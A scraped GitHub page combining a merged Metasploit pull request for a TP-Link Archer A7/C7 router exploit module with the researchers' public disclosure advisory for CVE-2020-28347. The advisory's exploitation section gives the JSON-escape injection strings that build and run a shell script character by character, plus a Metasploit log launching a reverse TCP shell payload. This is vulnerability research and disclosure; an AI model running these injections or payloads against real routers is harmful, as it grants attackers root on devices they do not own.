* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Update TP-Link AC1750 Pwn2Own 2019 module #14365

 Merged

[timwr](/timwr)
merged 1 commit into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[pedrib:archer\_update](/pedrib/metasploit-framework/tree/archer_update "pedrib/metasploit-framework:archer_update")

Nov 26, 2020

 Merged

# [Update TP-Link AC1750 Pwn2Own 2019 module](#top) #14365

[timwr](/timwr)
merged 1 commit into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[pedrib:archer\_update](/pedrib/metasploit-framework/tree/archer_update "pedrib/metasploit-framework:archer_update")

Nov 26, 2020

[Conversation
12](/rapid7/metasploit-framework/pull/14365)
[Commits
1](/rapid7/metasploit-framework/pull/14365/commits)
[Checks
0](/rapid7/metasploit-framework/pull/14365/checks)
[Files changed](/rapid7/metasploit-framework/pull/14365/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![pedrib](https://avatars.githubusercontent.com/u/5311656?s=60&v=4)](/pedrib)

Copy link

Contributor

### @pedrib **[pedrib](/pedrib)** commented [Nov 8, 2020](#issue-738458681) • edited Loading

This PR updates the TP-Link AC1750 Pwn2Own Tokyo 2019 module to slightly modify the injection technique.

The new modified technique allows bypass of a patch that TP-Link issued in early 2020. The vulnerability was discovered and intended to be used in Pwn2Own Tokyo 2020, but they smartened up and patched it (this time for good) just a few days ago in the latest firmware.

The module now works on both old and new firmware up to the patched version, and also improves firmware version detection for both the A7 and C7 routers.

For more details please see: <https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md>

Sorry, something went wrong.

 🎉
4
 adfoster-r7, cdelafuente-r7, gwillcox-r7, and jvoisin reacted with hooray emoji
 ❤️
1
 numanturle reacted with heart emoji

All reactions

* 🎉
  4 reactions
* ❤️
  1 reaction

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 8, 2020](#issuecomment-723575951)

| I have requested a CVE number from MITRE for the bypass and will post here as soon as I get it. Otherwise, the module is good to go, as you can see besides the check the changes are minimal, and I have tested in both A7 and C7 versions, odl and new firmware. |
| --- |

All reactions

Sorry, something went wrong.

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
added
[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
labels
[Nov 16, 2020](#event-3999046503)

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 18, 2020](#issuecomment-729650803)

| yello this is good to go!  I'll promise I'll deal with [#14206](https://github.com/rapid7/metasploit-framework/pull/14206) straight after this :D |
| --- |

All reactions

Sorry, something went wrong.

[![timwr](https://avatars.githubusercontent.com/u/684924?s=60&v=4)](/timwr)

**[timwr](/timwr)**
approved these changes
[Nov 25, 2020](#pullrequestreview-538816270)

 [View reviewed changes](/rapid7/metasploit-framework/pull/14365/files)

Copy link

Contributor

### @timwr **[timwr](/timwr)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[@pedrib](https://github.com/pedrib) this looks OK to land.

Would you mind re-basing onto master and squashing it into single commit?

In theory I can do that for you...

Sorry, something went wrong.

All reactions

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 26, 2020](#issuecomment-734147322)

| [@timwr](https://github.com/timwr) I'm a git noob, how do I do that? |
| --- |

 😄
1
 timwr reacted with laugh emoji

All reactions

* 😄
  1 reaction

Sorry, something went wrong.

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=80&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)

Copy link

Contributor

### **[timwr](/timwr)** commented [Nov 26, 2020](#issuecomment-734261844)

| On the command line: `git rebase -i e33f4ea63e` then in the editor window do:  ``` pick 019ab9aea6 Update docs s 89b53c689f Update tplink_archer_a7_c7_lan_rce.rb s a35465c4e0 Add new advisory links s 0148b93752 fix typo s 2755660a9c Update tplink_archer_a7_c7_lan_rce.md s ee0cbd45b7 Add fixed fw version s 03b49cf203 Update tplink_archer_a7_c7_lan_rce.md s 0993248bdc Add new CVE ID  ```  to squash all the commits into one.  Alternatively you can just do:  ``` git reset --soft e33f4ea63e git commit -m "Update TP-Link AC1750 Pwn2Own 2019 module"  ```  Then just force push: `git push pedrib archer_update -f` |
| --- |

All reactions

Sorry, something went wrong.

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 26, 2020](#issuecomment-734276547)

| I think that's done? Hope I didn't destroy anything, let me know! |
| --- |

All reactions

Sorry, something went wrong.

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=80&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)

Copy link

Contributor

### **[timwr](/timwr)** commented [Nov 26, 2020](#issuecomment-734278486)

| Actually I think you just added 2 more commits rather than squashing the existing ones |
| --- |

 😄
1
 pedrib reacted with laugh emoji

All reactions

* 😄
  1 reaction

Sorry, something went wrong.

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 26, 2020](#issuecomment-734279355)

| Jebus, what a noob... do you mind squashing it for me? I think some of your guys were able to do that before. |
| --- |

All reactions

Sorry, something went wrong.

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=40&v=4)](/timwr)

`[Update TP-Link AC1750 Pwn2Own 2019 module](/rapid7/metasploit-framework/pull/14365/commits/a99ce581dd78b931fb11a4f2b5a634e6a4832a43 "Update TP-Link AC1750 Pwn2Own 2019 module")`

`[a99ce58](/rapid7/metasploit-framework/pull/14365/commits/a99ce581dd78b931fb11a4f2b5a634e6a4832a43)`

 [![@timwr](https://avatars.githubusercontent.com/u/684924?s=40&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)
[timwr](/timwr)
[force-pushed](/rapid7/metasploit-framework/compare/01643ef6121667ba168c7f5a79542e36b84e323e..a99ce581dd78b931fb11a4f2b5a634e6a4832a43)
the
archer\_update

branch
from
[`01643ef`](/rapid7/metasploit-framework/commit/01643ef6121667ba168c7f5a79542e36b84e323e) to
[`a99ce58`](/rapid7/metasploit-framework/commit/a99ce581dd78b931fb11a4f2b5a634e6a4832a43)  [Compare](/rapid7/metasploit-framework/compare/01643ef6121667ba168c7f5a79542e36b84e323e..a99ce581dd78b931fb11a4f2b5a634e6a4832a43)
[November 26, 2020 12:59](#event-4042424593)

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=80&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)

Copy link

Contributor

### **[timwr](/timwr)** commented [Nov 26, 2020](#issuecomment-734285709)

| I pushed it but now it shows us both in the commit, I hope that's OK. If so I'll go ahead and land it |
| --- |

All reactions

Sorry, something went wrong.

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=80&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)

Copy link

Contributor

Author

### **[pedrib](/pedrib)** commented [Nov 26, 2020](#issuecomment-734380285)

| of course, thank you! |
| --- |

All reactions

Sorry, something went wrong.

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=40&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)
[timwr](/timwr)
merged commit [`87eba68`](/rapid7/metasploit-framework/commit/87eba681e02c63a47449a84b3b49c821c09aba0d)
into
rapid7:master

[Nov 26, 2020](https://github.com/rapid7/metasploit-framework/pull/14365#event-4043751616)

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=80&u=698860b80fa0f23962524b00ff0a0988447121f7&v=4)](/timwr)

Copy link

Contributor

### **[timwr](/timwr)** commented [Nov 26, 2020](#issuecomment-734460557) • edited by pbarry-r7 Loading

| Original Release notes  This PR updates the TP-Link AC1750 Pwn2Own Tokyo 2019 module to slightly modify the injection technique. The new modified technique allows bypass of a patch that TP-Link issued in early 2020. The vulnerability was discovered and intended to be used in Pwn2Own Tokyo 2020, but they smartened up and patched it (this time for good) just a few days ago in the latest firmware. The module now works on both old and new firmware up to the patched version, and also improves firmware version detection for both the A7 and C7 routers. |
| --- |

All reactions

Sorry, something went wrong.

 [![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=40&u=8341ef6a13e4cf15c63a3035d2128407ca5a2b9a&v=4)](/pedrib)
[pedrib](/pedrib)
deleted the
archer\_update

branch
[December 1, 2020 09:03](#event-4055946560)

[![@pbarry-r7](https://avatars.githubusercontent.com/u/19912177?s=40&u=0b023c30367f79db5b30a53c18484dbec6ac9510&v=4)](/pbarry-r7)
[pbarry-r7](/pbarry-r7)
added
[enhancement](/rapid7/metasploit-framework/labels/enhancement)
[rn-enhancement](/rapid7/metasploit-framework/labels/rn-enhancement)
release notes enhancement
labels
[Dec 9, 2020](#event-4087577658)

[![@pbarry-r7](https://avatars.githubusercontent.com/u/19912177?s=80&u=0b023c30367f79db5b30a53c18484dbec6ac9510&v=4)](/pbarry-r7)

Copy link

Contributor

### **[pbarry-r7](/pbarry-r7)** commented [Dec 9, 2020](#issuecomment-741894817)

| Release Notes Updated the `exploits/linux/misc/tplink_archer_a7_c7_lan_rce` module (a.k.a. TP-Link AC1750 Pwn2Own 2019) with the additional ability to bypass a patch TP-Link issued in early 2020. |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14365)

Reviewers

[![@timwr](https://avatars.githubusercontent.com/u/684924?s=40&v=4)](/timwr) [timwr](/timwr)

timwr approved these changes

Assignees

No one assigned

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[enhancement](/rapid7/metasploit-framework/labels/enhancement)
[module](/rapid7/metasploit-framework/labels/module)
[rn-enhancement](/rapid7/metasploit-framework/labels/rn-enhancement)
release notes enhancement

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@pedrib](https://avatars.githubusercontent.com/u/5311656?s=52&v=4)](/pedrib) [![@timwr](https://avatars.githubusercontent.com/u/684924?s=52&v=4)](/timwr) [![@pbarry-r7](https://avatars.githubusercontent.com/u/19912177?s=52&v=4)](/pbarry-r7) [![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=52&v=4)](/cdelafuente-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f326dc20_20250119_111817.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2020%2Fminesweeper.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2020%2Fminesweeper.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=pedrib%2FPoC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pedrib](/pedrib)
/
**[PoC](/pedrib/PoC)**
Public

* [Notifications](/login?return_to=%2Fpedrib%2FPoC) You must be signed in to change notification settings
* [Fork
  167](/login?return_to=%2Fpedrib%2FPoC)
* [Star
   830](/login?return_to=%2Fpedrib%2FPoC)

* [Code](/pedrib/PoC)
* [Issues
  0](/pedrib/PoC/issues)
* [Pull requests
  0](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects
  0](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

Additional navigation options

* [Code](/pedrib/PoC)
* [Issues](/pedrib/PoC/issues)
* [Pull requests](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

## Files

 master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2020](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020)
/
# minesweeper.md

Copy path Blame  Blame
## Latest commit

## History

[History](/pedrib/PoC/commits/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md)212 lines (149 loc) · 12.5 KB master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2020](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020)
/
# minesweeper.md

Top
## File metadata and controls

* Preview
* Code
* Blame

212 lines (149 loc) · 12.5 KB[Raw](https://github.com/pedrib/PoC/raw/refs/heads/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md)
# minesweeper

---

# Summary

This advisory describes a command injection vulnerability that was found by **Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)** and **Radek Domanski (@RabbitPro | radek.domanski@gmail.com)** and was supposed to be presented at [Zero Day Initiative](https://www.zerodayinitiative.com/) **Pwn2Own Tokyo 2020** competition in November 2020 (see below why "supposed").

The vulnerability exists in the tdpServer daemon (*/usr/bin/tdpServer*), running on the router TP-Link Archer A7 and C7 (AC1750), hardware version 5, MIPS Architecture, firmware versions 200721 and 200628 respectively.

This vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.

All function offsets and code snippets in this advisory were taken from */usr/bin/tdpServer*, firmware version 200721 of A7 model.

During Pwn2Own 2019 we pwned the same service. Technical details of that exploit and details on the tdpServer are public and can be found here:

* [ZDI: Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)
* [Pedro's 2019 advisory](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md)
* [Radek's 2019 advisory](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)

Therefore, we refer to those publications to understand inner working of the service and in this advisory we will only focus on differences to an exploit from 2019.

We have also made a [video version of this advisory](https://www.youtube.com/watch?v=zjafMP7EgEA), we highly recommend you check it out!

[![Exploiting (and Patching) a Zero Day RCE Vulnerability in a Western Digital NAS](https://camo.githubusercontent.com/a7039492587afddec0b9041dafa03b018d45476c3c0f9858cc91ca073c189fef/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f7a6a61664d5037456745412f302e6a7067)](https://www.youtube.com/watch?v=zjafMP7EgEA)

## We never got to use it...

This vulnerability was patched by TP-Link on [firmware 201029 for the A7 version](https://static.tp-link.com/2020/202011/20201104/Archer%20A7%28US%29_V5_201029.zip) and [201030 for the C7 version](https://static.tp-link.com/2020/202011/20201104/Archer%20C7%28EU%29_V5_201030.zip). The patch was dropped one day before the competition, wiping out a lot of Pwn2Own contestants, including us, so the exploit described below was never used in the competition.

We have updated the [Metasploit module that we released last year](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb) with the new injection technique. This new technique also works with the older firmware that we exploited last year!

[CVE-2020-28347](https://nvd.nist.gov/vuln/detail/CVE-2020-28347) has been assigned for this vulnerability.

A copy of this advisory can be found at:

* [Pedro's GitHub repository](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md)
* [Radek's GitHub repository](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md)

Enjoy!

~ Team Flashback

# Vulnerability Details

## Background on *tdpServer*

The *tdpServer* daemon listens on port 20002/udp on interface 0.0.0.0. The whole functionality of the daemon is not fully understood by the authors, as this was unnecessary for exploitation. However, the daemon seems to be a bridge between the TP-Link mobile application and the router, allowing to establish some sort of control channel from the mobile application.

The daemon communicates with the mobile application through the use of UDP packets, with an encrypted payload.

For technical details on how tdpServer works and processes encrypted packets please refer to the publications of [*lao\_bomb*](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md) referenced above (from our [Pwn2Own 2019 whitepaper](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)).

## Understanding the vulnerability

TP-Link patched the original CVE-2020-10882 vulnerability which was described as:

> This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Archer A7 Firmware Ver: 190726 AC1750 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the tdpServer service, which listens on UDP port 20002 by default. When parsing the slave\_mac parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the root user.

So the original vulnerability was a command injection in the prepared string that was passed to system():

```
(...)
  print_debug("tdpOneMesh.c:3363","Sync wifi for specified mac %s start.....",slaveMac);
  memset(systemCmd,0,0x200);
  snprintf(systemCmd,0x1ff,
    "lua -e \'require(\"luci.controller.admin.onemesh\"). \
    sync_wifi_specified({mac=\"%s\"})\'",slaveMac);
  print_debug("tdpOneMesh.c:3368","systemCmd: %s",systemCmd);
  system(systemCmd);
  print_debug("tdpOneMesh.c:3370","Sync wifi for specified mac %s end.....",slaveMac);
(...)
```
> Snippet 1: Vulnerability exploited by us in Pwn2Own 2019 (CVE-2020-10882)

The fix by TP-Link removed the call to system() and instead used Lua C bindings to invoke a lua script:

```
print_debug("tdpOneMesh.c:3401", "Sync wifi for specified mac %s start.....", slave_mac);
lua_onemesh_call(slave_mac);
```
> Snippet 2: Call to lua\_onemesh\_call (0x416164)

This removed the possibility for a command injection on the system() call, since it doesn't exist any more.

However, looking at the lua\_onemesh\_call() is can be observed that the "luci.controller.admin.onemesh" lua script is still invoked. It uses a special function named "dispatch" that passes an argument and executes a handler for a requested function. In this case it will be a request to execute sync\_wifi\_specified(slave\_mac). slave\_mac is an argument that we control when we send the UDP packet.

```
lua_pcall_obj = lua_pcall("luci.controller.admin.onemesh");
if (lua_pcall_obj != 0) {
	iVar1 = lua_get_table_and_call(lua_pcall_obj,"dispatch",arg,&PTR_s_form_0041aac0,0);
```
> Snippet 3: lua\_onemesh\_call (0x4171ac)

At this point a deeper look at how lua scripts work in the router is needed. Lua scripts are compiled so we need to understand its disassembly. Fortunately, lua is a stack based language so it is relatively easy to understand its logic.

The sync\_wifi\_specified() is quite long so only the vulnerable part is presented here:

```
  179 [-]: GETTABLE  R10 R0 K0    ; R10 := R0["mac"]
  180 [-]: SETTABLE  R9 K51 R10   ; R9["target_id"] := R10
  181 [-]: GETUPVAL  R10 U2       ; R10 := U2
  182 [-]: GETTABLE  R10 R10 K40  ; R10 := R10["encode"]
  183 [-]: MOVE      R11 R9       ; R11 := R9
  184 [-]: CALL      R10 2 2      ; R10 := R10(R11)
  185 [-]: GETUPVAL  R11 U0       ; R11 := U0
  186 [-]: GETTABLE  R11 R11 K52  ; R11 := R11["printf"]
  187 [-]: LOADK     R12 K53      ; R12 := "ubus call sync sync_wifi \'"
  188 [-]: MOVE      R13 R10      ; R13 := R10
  189 [-]: LOADK     R14 K54      ; R14 := "\' &"
  190 [-]: CONCAT    R12 R12 R14  ; R12 := concat(R12 to R14)
  191 [-]: CALL      R11 2 1      ;  := R11(R12)
  192 [-]: GETUPVAL  R11 U4       ; R11 := U4
  193 [-]: GETTABLE  R11 R11 K55  ; R11 := R11["fork_call"]
  194 [-]: LOADK     R12 K53      ; R12 := "ubus call sync sync_wifi \'"
  195 [-]: MOVE      R13 R10      ; R13 := R10
  196 [-]: LOADK     R14 K54      ; R14 := "\' &"
  197 [-]: CONCAT    R12 R12 R14  ; R12 := concat(R12 to R14)
  198 [-]: CALL      R11 2 1      ;  := R11(R12)
  199 [-]: LOADBOOL  R11 1 0      ; R11 := true
  200 [-]: RETURN    R11 2        ; return R11
  201 [-]: RETURN    R0 1         ; return
```
> Snippet 4: Disassembly of sync\_wifi\_specified() in luci.controller.admin.onemesh

Our controlled parameter (slave\_mac) is assigned to a key "target\_id". A command is constructed using printf which is next passed to the fork\_call lua function. As it can be seen in lines 187 - 189, json content is injected and the actual command prototype is: `ubus call sync sync_wifi '<json>' &`.

As our controlled parameter is not sanitized before constructing the json we can escape the json context and execute commands within the scope of the lua script process, which runs as root. Effectively a following command will be executed by the lua and run in a shell:

```
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"<Controlled_Parameter>"}' &
```

# Exploitation

## Reaching the vulnerable function

To reach a vulnerable function we need to construct and encrypt a packet with specific parameters. As the packet structure is the same as described in the previous advisory we will not discuss it here. Please refer to [last year's advisory for details](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo).

## Achieving code execution

Similarly to CVE-2020-10882 we are still limited by the 0x11 characters that we can use. strncpy() copies the slave\_mac\_info key into the slaveMac variable:

`strncpy(slave_mac,*(char **)(iVar6 + 0x10),0x11);`.

strncpy() doesn't null-terminate the destination string by default, so the usable length is supposedly to be 16 characters. However, we are saved by two things:

1. at the beginning of the function the whole buffer space is memset to 0 (`memset(slave_mac,0,0x424);`);
2. due to byte alignment, the slave\_mac variable is actually at least 0x12 (18) chars. This means that even if we send 17 characters, the string will always be null terminated.

So even if we inject 17 characters, the string will always be null terminated, which is essential for the exploit to succeed. Note that it might be possible to inject more characters at once, but this was the quickest path to success, and we did not focus on efficiency.

Since we have the same limitations to last year's exploit, we need to use a similar approach of printing character by character into a file and execute it as a shell script in the last step.
In addition, escaping needs to be done differently:

```
'`<PAYLOAD\>`'

```

A running exploit looks like this:

```
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf ';'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf '.'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf '/'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf 'q'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`sh b`'"}' &
```
> Snippet 5: Example of sending payload char by char

### PoC

```
msf6 > use exploit/linux/misc/minesweeper
[*] Using configured payload linux/mipsbe/shell_reverse_tcp
msf6 exploit(linux/misc/minesweeper) > set rhost 192.168.0.1
rhost => 192.168.0.1
msf6 exploit(linux/misc/minesweeper) > set lhost 192.168.0.100
lhost => 192.168.0.100
msf6 exploit(linux/misc/minesweeper) > set srvhost 192.168.0.100
srvhost => 192.168.0.100
msf6 exploit(linux/misc/minesweeper) > run

[*] Started reverse TCP handler on 192.168.0.100:4444
[*] Attempting to exploit TP-Link Archer A7/C7 (AC1750) v5 (firmware 200721)
[*] Starting up our web service on http://192.168.0.100:8080 ...
